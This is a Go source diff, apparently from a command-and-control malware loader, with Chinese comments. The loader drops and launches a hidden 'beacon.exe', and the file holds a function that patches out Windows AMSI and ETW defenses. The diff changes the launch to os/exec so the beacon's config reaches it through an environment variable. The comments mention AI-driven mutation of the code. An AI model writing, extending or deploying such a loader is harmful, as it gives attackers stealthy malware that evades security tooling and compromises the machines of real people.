@@ -9,6 +9,7 @@ package main
 import (
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"syscall"
@@ -41,6 +42,10 @@ var _dropName = "beacon.exe"
 // _padTail 由生成器注入：IPv4 编码前补齐到 4 倍数的 0x90 尾部长度——解码后
 // 必须裁掉，否则附加在 beacon trailer 之后的填充字节会让 beacon 自读配置失配。
 var _padTail = 0
+
+// _trailerJSON 由生成器注入：完整 beacon 配置 JSON（经 GOC2_CFG_JSON 下发子进程，
+// beacon 端 env 兜底解析——donut/重命名场景 trailer 自读不可靠时的保底通道）。
+var _trailerJSON = []byte("{}")
 
 func patchAMSIAndETW() {
 	k := syscall.NewLazyDLL("kernel32.dll")
@@ -126,16 +131,15 @@ func main() {
 	}
 	defer os.Remove(dst) // 父进程退出时清理
 
-	// CreateProcess 挂起→恢复可选；直接执行并等待
-	si := &syscall.StartupInfo{}
-	pi := &syscall.ProcessInformation{}
-	cmdLine, _ := syscall.UTF16PtrFromString(dst)
-	const CREATE_NO_WINDOW = 0x08000000
-	if err := syscall.CreateProcess(nil, cmdLine, nil, nil, false,
-		CREATE_NO_WINDOW, nil, nil, si, pi); err != nil {
+	// 子进程执行：os/exec + cmd.Env 注入 GOC2_CFG_JSON（beacon 兜底解析）。
+	// 裸 CreateProcess 的 UTF-16 环境块格式要求苛刻（排序/双 NUL），AI 变形
+	// 重排字段后曾触发 "The parameter is incorrect"——exec 由 runtime 保证格式。
+	env := append(os.Environ(), "GOC2_CFG_JSON="+string(_trailerJSON))
+	cmd := exec.Command(dst)
+	cmd.Env = env
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+	if err := cmd.Start(); err != nil {
 		return
 	}
-	syscall.WaitForSingleObject(syscall.Handle(pi.Process), 0xFFFFFFFF)
-	syscall.CloseHandle(syscall.Handle(pi.Process))
-	syscall.CloseHandle(syscall.Handle(pi.Thread))
+	_ = cmd.Wait()
 }
